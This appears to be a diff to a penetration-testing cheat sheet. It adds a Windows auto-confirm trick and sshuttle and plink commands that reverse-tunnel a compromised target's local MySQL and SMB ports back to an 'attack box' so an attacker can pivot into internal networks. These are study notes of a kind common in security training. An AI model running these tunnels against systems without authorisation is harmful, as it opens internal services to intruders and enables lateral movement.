@@ -3,7 +3,10 @@
 
 File extensions to search for:   `*.txt, *.pdf, *.ini, *.doc, *.docx, *.xls, *.xlsx`
 
-
+##### Automate confirmation when running a command w/in a limited shell on Windows
+```powershell
+cmd.exe /c echo y | [cmd]
+```
 
 ##### Reboot system
 ```powershell
@@ -1355,3 +1358,51 @@ socks5 127.0.0.1 [port]
 
 
 ## sshuttle
+
+##### Setup Remote Port Forward, specifying the SSH connection string and subnets that we want to tunnel through
+```bash
+sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24
+```
+
+## plink
+
+##### Setup Remote Port Forward via SSH
+```powershell
+#		Step 1. Estabish SSH Tunnel from Remote
+#
+#[Attack Box] <<=========[SSH]========[+] [Remote]
+#
+#127.0.0.1:[port]					127.0.0.1:[port]
+#		   [+]									 ^
+#        	|____________________________________|
+#        
+#    Step 2. Reverse Forward Attack Box Port to Remote
+
+# Example Commands
+# ----------------
+# Open 127.0.0.1:33060 on Attack Box
+# Tunnel to 127.0.0.1:3306 on target
+```
+
+##### PW Authentication
+```powershell
+echo 'y' | .\plink.exe -ssh -l [attack_uname] -pw [attack_pw] -batch -N -R 127.0.0.1:33060:127.0.0.1:3306 attack-box-ip
+```
+	- Possibly `cmd.exe /c echo y`
+
+##### Private key authentication
+```powershell
+echo 'y' | .\plink.exe -ssh -l [attack_uname] -i C:\Windows\Temp\key.pem -batch -N -R 127.0.0.1:33060:127.0.0.1:3306 attack-box-ip
+```
+	- Possibly `cmd.exe /c echo y`
+ 
+##### Multiple port forwards
+```powershell
+echo 'y' | .\plink.exe -ssh -l [attack_uname] -i C:\Windows\Temp\key.pem -batch -N -R 127.0.0.1:33060:127.0.0.1:3306 -R 127.0.0.1:4445:127.0.0.1:445 attack-box-ip
+```
+	- Possibly `cmd.exe /c echo y`
+
+
+## netsh
+
+.
